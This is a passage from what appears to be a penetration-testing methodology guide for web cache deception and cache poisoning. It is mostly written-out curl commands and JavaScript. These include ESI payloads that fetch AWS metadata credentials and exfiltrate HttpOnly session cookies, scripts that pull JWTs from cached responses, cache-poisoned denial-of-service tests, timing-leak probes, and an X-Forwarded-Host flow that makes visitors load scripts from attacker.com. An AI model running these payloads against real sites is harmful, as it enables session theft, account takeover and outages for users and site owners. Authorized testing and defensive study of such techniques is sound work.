curl -s -X GET -d "param=test_value" "https://TARGET/api/endpoint"
# Different response → body influences response
# Cache ignores body → poisoned under URL only
```

**Parameter cloaking (Rails Rack):**
```bash
# CDN strips utm_content from cache key but passes full value
# Rails parses ; as parameter separator
curl -s "https://TARGET/page?utm_content=x;callback=evil_function"
# Cached under /page; response contains evil_function(...)
```

### ESI Injection

**ESI-capable systems:** Akamai, Fastly, Varnish, Squid

```bash
# Detect ESI processing
curl -s "https://TARGET/search?q=%3Cesi:debug+/%3E" | head -20
curl -s "https://TARGET/search?q=%3Cesi:include+src=%27/robots.txt%27+/%3E" | grep -i "disallow"

# SSRF via ESI (AWS metadata)
# q=<esi:include src='http://169.254.169.254/latest/meta-data/iam/security-credentials/'/>

# Cookie exfiltration bypassing HttpOnly
# input=<esi:vars>$(HTTP_COOKIE{session_id})</esi:vars>
# ESI is server-side — HttpOnly only prevents JavaScript access, not ESI

# ESI + WCD chain
# 1. Inject ESI into cacheable page: <esi:include src='/api/user/me'/>
# 2. If ESI fragment caches: first user's data served to all
curl -s -H "Cookie: session=ACCOUNT_A" \
  "https://TARGET/product/123?review=%3Cesi:include+src=%27/api/user/me%27+/%3E" \
  -o /tmp/esi-prime.html
sleep 2
curl -s -H "Cookie: session=ACCOUNT_B" \
  "https://TARGET/product/123?review=%3Cesi:include+src=%27/api/user/me%27+/%3E" \
  -o /tmp/esi-probe.html
diff /tmp/esi-prime.html /tmp/esi-probe.html  # Identical → cross-user WCD
```

### Cache-Poisoned Denial of Service (CPDoS)

**Three variants:**
1. **HHO (Header Oversize):** CDN accepts larger headers than origin → origin returns 400 → cached
2. **HMC (HTTP Meta Characters):** Control chars in headers trigger origin rejection → cached error
3. **HMO (HTTP Method Override):** `X-HTTP-Method-Override: DELETE` on GET → CDN caches GET, origin returns error

**Testing (requires explicit authorization; never on homepage/critical paths):**
```bash
CB="hho-$(openssl rand -hex 6)"
PADDING=$(python3 -c "print('A' * 10000)")
curl -s -D /tmp/hho-headers -H "X-Oversized-Header: $PADDING" \
  "https://TARGET/low-traffic-page?cb=${CB}" -o /tmp/hho-body.html
# If status 400 and cache shows HIT on clean re-request → HHO confirmed
sleep 2
curl -sI "https://TARGET/low-traffic-page?cb=${CB}" | grep -i "cf-cache"
```

**HMC Control Characters:**
- Null byte: `0x00`
- Line feed: `0x0A`
- Carriage return: `0x0D`
- Bell: `0x07`
- Escape: `0x1B`

**CPDoS exposure (CCS 2019):** 30% of Alexa Top 500 vulnerable; all 5 tested CDN providers were affected.

**CPDoS + WCD combo:** Use CPDoS to force a cache MISS on a page (via short-TTL error), then immediately race to prime with WCD payload. Converts "WCD works only on uncached URLs" to "WCD works on any URL."

### XS-Leaks via Cache Timing

**Server-side hidden cache detection:**
```bash
# Collect 20 uncached (unique CB) times and 20 paired (same CB) times
# Ratio cached_mean / baseline_mean < 0.7 → hidden cache detected
```

**Browser-side Performance API timing:**
```javascript
async function probeCacheByTiming(url, threshold = 50) {
    const times = [];
    for (let i = 0; i < 5; i++) {
        const start = performance.now();
        try {
            await fetch(url, { mode: 'no-cors', cache: 'force-cache', credentials: 'omit' });
        } catch(e) {}
        times.push(performance.now() - start);
    }
    times.sort((a, b) => a - b);
    return { url, cached: times[Math.floor(times.length / 2)] < threshold };
}
```

**Error-event probing (more reliable):**
```javascript
function probeWithImage(url, timeout = 2000) {
    return new Promise((resolve) => {
        const img = new Image();
        const start = performance.now();
        const cleanup = () => { img.onload = null; img.onerror = null; img.src = ''; };
        const timer = setTimeout(() => { cleanup(); resolve({ cached: false }); }, timeout);
        img.onload = img.onerror = () => {
            clearTimeout(timer);
            const elapsed = performance.now() - start;
            cleanup();
            resolve({ cached: elapsed < 30, time: elapsed });
        };
        img.src = url;
    });
}
```

**Mann-Whitney U statistical validation:** Use `scipy.stats.mannwhitneyu` to compare cached vs uncached timing distributions; p < 0.05 confirms timing differential is not noise.

**WCD + XS-Leak chain:** Craft WCD URL → victim visits while authenticated → CDN caches private data → attacker probes WCD URL via XS-Leak timing to detect cache entry → attacker fetches cached response server-side.

---

## Phase 11: OAuth/JWT Token Exploitation

### Token Extraction from Cached Response

```bash
WCD_ID=$(openssl rand -hex 4)
curl -s -D /tmp/jwt-prime-headers -b "session=ACCOUNT_A_SESSION_COOKIE" \
  "https://TARGET/api/auth/session;wcd-${WCD_ID}.css" -o /tmp/jwt-prime-body.json
sleep 3
curl -s "https://TARGET/api/auth/session;wcd-${WCD_ID}.css" -o /tmp/jwt-probe-body.json

# Extract JWT from response
JWT=$(cat /tmp/jwt-probe-body.json | python3 -c "
import json, sys
data = json.load(sys.stdin)
for path in ['accessToken', 'access_token', 'token', 'jwt', 'id_token',
             'session.accessToken', 'data.token', 'pageProps.session.accessToken']:
    obj = data
    try:
        for key in path.split('.'): obj = obj[key]
        if isinstance(obj, str) and '.' in obj: print(obj); break
    except: continue
")
```

### High-Value Endpoints for Token Extraction

| Endpoint | Framework | Token Type |
|----------|-----------|------------|
| `/api/auth/session` | Next.js (NextAuth) | accessToken JWT + session |
| `/api/me`, `/api/user` | Generic REST | Bearer token |
| `/_next/data/<buildId>/...json` | Next.js | pageProps.session.accessToken |
| `/__data.json` | SvelteKit | User data + tokens |
| `/_payload.json` | Nuxt | User data |
| `/graphql?query={me{...}}` | GraphQL | User data |

### JWT Claims to Check for Severity Escalation

```bash
# Decode JWT
JWT_PAYLOAD=$(echo "$JWT" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool)

# Check for admin role
echo "$JWT_PAYLOAD" | grep -i '"admin"\|"superuser"\|"owner"'

# Check expiration window
EXP=$(echo "$JWT_PAYLOAD" | python3 -c "import json,sys; print(json.load(sys.stdin).get('exp',0))")
echo "Remaining seconds: $(( EXP - $(date +%s) ))"

# Check for token binding (freely replayable if cnf absent)
echo "$JWT_PAYLOAD" | python3 -c "import json,sys; d=json.load(sys.stdin); print('BOUND' if 'cnf' in d else 'FREELY_REPLAYABLE')"
```

**Critical JWT claims:**

| Claim | Key | Impact if Extracted |
|-------|-----|-------------------|
| Subject/User ID | `sub` | Identify target |
| Email | `email` | PII + account enumeration |
| Roles | `roles`, `scope`, `permissions` | Privilege escalation if admin |
| Expiration | `exp` | Viability window |
| DPoP binding | `cnf` | If absent: freely replayable |
| Authorization context | `iss`, `aud` | Token scope |

### Refresh Token Impact

A cached refresh token is **Critical severity regardless of access token TTL**:
- Lifetime: 30-90 days or indefinite
- Self-renewing: single extraction → unlimited new access tokens
- `stale-while-revalidate` extends the exploitation window further

### CSRF Token → Account Takeover Chain

```
1. WCD → cache /settings page containing CSRF token
2. Extract CSRF token from cached response
3. Craft form submission to email-change endpoint with stolen CSRF
4. Victim visits attacker page → browser sends with victim's session cookie
5. Email change → password reset → full account takeover

Requirements: SameSite=None or Lax; email change doesn't require password re-entry;
              no verification on old email address
```

---

## Phase 12: Edge Compute and Lambda@Edge

### Cloudflare Workers `caches.default`

Workers using `caches.default` cache ALL responses including authenticated ones under URL-only keys (no cookie in cache key).

```bash
curl -s -H "Cookie: session=ACCOUNT_A_SESSION" "https://TARGET/api/profile" \
  -D /tmp/worker-prime-headers.txt -o /tmp/worker-prime.json
grep -iE "cf-cache-status|age" /tmp/worker-prime-headers.txt
sleep 1
curl -s "https://TARGET/api/profile" -o /tmp/worker-probe.json
diff /tmp/worker-prime.json /tmp/worker-probe.json
# Identical → Worker cached authenticated response
```

### Lambda@Edge URI Rewriting

Lambda@Edge viewer-request functions rewrite URIs AFTER CloudFront computes the cache key.

```
CloudFront cache key: /api/user/profile.css (original URI with extension)
Origin receives: /api/user/profile (rewritten — Lambda stripped extension)
Result: Authenticated profile data cached under /api/user/profile.css
```

```bash
curl -s -H "Authorization: Bearer ACCOUNT_A_TOKEN" \
  "https://TARGET/api/user/profile.css" -o /tmp/lambda-prime.json
curl -s "https://TARGET/api/user/profile.css" -o /tmp/lambda-probe.json
diff /tmp/lambda-prime.json /tmp/lambda-probe.json
```

### Next.js ISR on Vercel

ISR pages are rendered on-demand and cached at the edge. First user's data is served to all users for the `revalidate` period.

```bash
# Check for ISR
curl -sI -H "Cookie: session=ACCOUNT_A_SESSION" "https://TARGET/dashboard" | \
  grep -iE "x-vercel-cache|cache-control.*s-maxage"
# x-vercel-cache: HIT or STALE = ISR caching active
```

---

## Phase 13: Sensitive Endpoint Discovery

### Priority Scoring

| Factor | Points |
|--------|--------|
| Contains auth tokens (CSRF, session, JWT) | +5 |
| Contains admin data | +5 |
| Contains financial data | +4 |
| Contains PII (email, name, phone) | +3 |
| Cache-Control is missing or `public` | +3 |
| Response is HTML with `__NEXT_DATA__` | +2 |
| Response is JSON (API endpoint) | +1 |
| Cache-Control is `no-store, private` | -2 |
| `Vary: Cookie` present | -1 |

**Tier 1 (Score 6+):** `/api/auth/session`, `/api/me`, `/graphql`, `/_next/data/<buildId>/account.json`

**Tier 2 (Score 3-5):** `/account`, `/dashboard`, `/settings`, `/api/user/profile`

### Common Sensitive URL Patterns

```
/api/user    /api/me       /api/v1/user    /api/v2/users/me
/api/auth/session          /oauth/userinfo
/_next/data/<buildId>/account.json
/account/__data.json       /settings/_payload.json
/billing     /api/invoices /api/payment-methods
/admin/dashboard           /api/admin/users
/messages    /notifications /api/conversations
/rails/active_storage/blobs/proxy/<signed_id>/filename
```

---

## Phase 14: Impact Assessment and CVSS

### Data Classification by Severity

| Data Type | Examples | CVSS Baseline |
|-----------|---------|---------------|
| OAuth refresh tokens | Long-lived token exchange | Critical (C:H/I:H) |
| Session tokens with ATO | JWT, session cookie with replay | High to Critical |
| Session tokens (no replay) | JWT, session, CSRF | High |
| Financial data | Credit card, billing, invoices | High |
| API keys | Service keys, webhook secrets | High |
| PII | Email, phone, name, address | Medium |
| CSRF tokens only | Anti-CSRF form tokens | Medium |
| Internal identifiers | User IDs, tenant IDs | Low |

### Common CVSS 3.1 Scores for WCD

```
PII only (no tokens):             AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N = 4.7
CSRF + demonstrated chain:        AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N = 6.1
Session token (replay proven):    AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N = 7.4
Session token + ATO:              AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N = 9.3
OAuth tokens (replay proven):     AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N = 9.3
Admin credentials / cross-tenant: AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H = 9.6
```

**CWE references:** CWE-525 (Use of Web Browser Cache Containing Sensitive Information), CWE-524

### Bug Bounty Tier Reference

| Scenario | CVSS | Typical Bounty |
|----------|------|----------------|
| Cached page with CSRF token only | 3.1-4.0 | Low ($50-$200) |
| Cached PII (email, name, phone) | 4.0-5.5 | Medium ($200-$1,000) |
| CSRF + demonstrated state change | 5.5-7.0 | Medium-High ($500-$2,000) |
| Session token with replay | 7.0-8.5 | High ($2,000-$10,000) |
| OAuth tokens with replay | 7.5-9.0 | High-Critical ($5,000-$25,000) |
| Admin creds or cross-tenant | 9.0-10.0 | Critical ($10,000-$50,000+) |

---

## Phase 15: Real-World Findings Reference

### Known Bug Bounty Findings

- **HackerOne #1391635:** Cloudflare CDA bypass via `.avif` extension
- **CVE-2025-29927:** Next.js middleware bypass via `x-middleware-subrequest` header — authenticated cached responses exposed
- **CVE-2024-46982:** Next.js Stale Elixir — `x-now-route-matches` triggers `s-maxage=31536000` caching on user data
- **CVE-2024-34351:** Next.js SSRF via Host header on Server Actions
- **CVE-2025-61598:** Discourse (Rails) — semicolon + Cloudflare extension caching exposing CSRF tokens
- **CCS 2019 Research (CPDoS):** 30% of Alexa Top 500 vulnerable to CPDoS; all 5 tested CDN providers were affected

### Common Real-World Patterns

1. `/_next/data/<buildId>/account.json` cached under `/_next/` prefix → full user object in pageProps exposed
2. `/api/auth/session;wcd.css` on Spring Boot behind Cloudflare → JWT access token + refresh token exposed
3. `/static/..%2faccount` on Nginx behind Akamai → session page with CSRF token cached
4. Next.js ISR on Vercel: `x-vercel-cache: HIT` on user dashboard — first user's data served for `revalidate` period to all users
5. ESI injection on Varnish: reflected input containing `<esi:include src='/api/user/me'/>` in product page → `$(HTTP_COOKIE{session_id})` exfiltrated

---

## Quick-Reference: Testing Checklist

### Stage 1: Reconnaissance
- [ ] Identify CDN (signature headers)
- [ ] Determine normalization camp (non-normalizing vs normalizing)
- [ ] Detect framework (Spring/Rails/Next.js/Django/Express/PHP/IIS)
- [ ] Check for Cache Deception Armor (Cloudflare)

### Stage 2: Cache Mapping
- [ ] Discover which extensions are cached
- [ ] Discover which directory prefixes are cached
- [ ] Determine if query strings are in cache key
- [ ] Check if origin `Cache-Control: no-store` is honored

### Stage 3: Differential Discovery
- [ ] Test all 8 delimiter types
- [ ] Test path normalization (Direction 1 and 2)
- [ ] Framework-specific: semicolons (Spring), dot format (Rails), catch-all (Next.js)

### Stage 4: Payload Construction
- [ ] Family 1A: delimiter + extension
- [ ] Family 1B: path append (catch-all routes)
- [ ] Family 3A: directory traversal (non-normalizing CDN)
- [ ] Family 4A: compound delimiter+traversal (normalizing CDN)
- [ ] Framework data routes: `/_next/data/`, `/__data.json`, `/_payload.json`
- [ ] Family 8A: GraphQL GET caching (if CDN excludes query)

### Stage 5: Verification
- [ ] Two-session protocol (all 6 steps)
- [ ] 5 negative controls
- [ ] 2 independent reproductions with different canary values

### Stage 6: Advanced (if applicable)
- [ ] HTTP smuggling (CL.TE, TE.CL, H2.CL, H2.TE)
- [ ] Unkeyed headers (X-Forwarded-Host, X-Original-URL)
- [ ] ESI injection (Varnish, Akamai, Fastly, Squid)
- [ ] Edge compute (Cloudflare Workers, Lambda@Edge, Vercel ISR)
- [ ] CPDoS (only with explicit written authorization)

### Stage 7: Post-Exploitation
- [ ] Extract and decode any JWT tokens
- [ ] Check for refresh tokens (Critical regardless of access token TTL)
- [ ] Test token replay (only if authorized)
- [ ] Assess CSRF → ATO chain viability

### Stage 8: Cleanup (Mandatory)
- [ ] Purge all test cache entries via CDN API or wait for TTL
- [ ] Verify canary no longer appears in cached responses
- [ ] Restore Account A profile to pre-test state


---

## From hack-skills: Web Cache Deception & Cache Poisoning

### Cache Deception Attack Flow

**Goal**: Trick cache into storing authenticated user's response, then retrieve it unauthenticated.

```
1. Attacker sends victim a crafted URL:
   https://target.com/account/profile/nonexistent.css
   
2. Victim visits URL while authenticated:
   - App: ignores .css suffix, serves /account/profile (authenticated response)
   - CDN: sees .css extension → caches the response
   
3. Attacker visits same URL unauthenticated:
   - CDN: returns cached response (victim's authenticated data!)
```

**Verification**: Check `X-Cache: HIT` on unauthenticated follow-up request.

### Path Confusion Techniques

```
# Static extension append:
/account/profile/x.css
/account/profile/x.js
/account/profile/x.png

# Semicolon delimiter confusion:
/account/profile;.css     → app sees /account/profile, CDN sees .css extension

# URL-encoded slash:
/account/profile%2F.css   → different normalization by app vs CDN

# Query string with extension:
/account/profile?cb=x.css
```

### Finding Unkeyed Cache Inputs

Headers NOT in cache key (CDN ignores them, server reflects them):
```
X-Forwarded-Host: injected.attacker.com   → Host header poisoning
X-Forwarded-Scheme: http                   → Force HTTP redirect
X-Original-URL: /admin                     → Path override (Nginx/Drupal)
X-Rewrite-URL: /admin                      → Path override (IIS)
```

### Cache Poisoning via X-Forwarded-Host

```
1. Send request with:
   GET / HTTP/1.1
   Host: target.com
   X-Forwarded-Host: attacker.com

2. If response reflects "attacker.com" in URLs or scripts
   → CDN caches the page with attacker domain

3. All subsequent users receiving cached response load scripts from attacker.com
   → Stored XSS for all visitors
```

### Path Normalization Differential (CDN vs App)

| Payload | CDN Sees | App Sees |
|---|---|---|
| `/profile/..%2F..%2Fadmin` | `/profile/../../admin` | `/admin` |
| `/profile;.css` | `/profile` (w/ `.css`) | `/profile;.css` |
| `/profile/.css` | static (`.css`) | `/profile/.css` |
| `/api/users%0A.js` | static (`.js`) | `/api/users` (after decode) |
